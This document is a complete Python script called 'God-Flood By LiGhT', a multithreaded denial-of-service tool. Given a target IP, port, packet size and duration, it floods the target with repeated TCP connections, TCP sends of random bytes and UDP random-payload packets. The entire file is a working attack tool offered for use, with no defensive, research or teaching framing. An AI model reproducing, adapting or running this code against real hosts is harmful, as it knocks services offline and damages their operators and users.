#!/usr/bin/env python
import threading, sys, time, random, socket
from datetime import datetime

if len(sys.argv) < 5:
    print("God-Flood By LiGhT")
    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time> [threads]")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
duration = int(sys.argv[4])
thread_count = 10  # Default thread count
if len(sys.argv) > 5:
    thread_count = int(sys.argv[5])

# Shared variable to control threads
running = True

class SynFlood(threading.Thread):
    def __init__(self, ip, port, packets):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.packets = packets
        self.daemon = True
        
    def run(self):
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, self.port))
                s.close()
            except:
                pass

class TcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.daemon = True
        
    def run(self):
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.ip, self.port))
                bytes = random._urandom(self.size)
                s.send(bytes)
                s.close()
            except:
                pass

class UdpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        threading.Thread.__init__(self)
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.daemon = True
        
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while running:
            try:
                bytes = random._urandom(self.size)
                target_port = self.port if self.port != 0 else random.randrange(1, 65535)
                s.sendto(bytes, (self.ip, target_port))
            except:
                pass
        s.close()

def main():
    global running
    
    if size > 65507:
        sys.exit("Packet size too large! Max is 65507 for UDP.")
    
    print(f"Starting flood against {ip}:{port} for {duration} seconds with {thread_count} threads per attack...")
    start_time = time.time()
    
    try:
        threads = []
        for _ in range(thread_count):
            threads.append(SynFlood(ip, port, size))
            threads.append(TcpFlood(ip, port, size, size))
            threads.append(UdpFlood(ip, port, size, size))
            
        for t in threads:
            t.start()
            
        # Run for the specified duration
        while time.time() - start_time < duration:
            time.sleep(1)
            
            # Display progress
            elapsed = int(time.time() - start_time)
            remaining = max(0, duration - elapsed)
            print(f"\rElapsed: {elapsed}s | Remaining: {remaining}s | Running threads: {threading.active_count()-1}", end="")
        
        running = False
        print("\nFlood completed. Stopping all threads...")
        
        # Wait briefly for threads to exit
        time.sleep(2)
        
    except KeyboardInterrupt:
        running = False
        print("\nStopping flood...")
        sys.exit(0)

if __name__ == "__main__":
    main()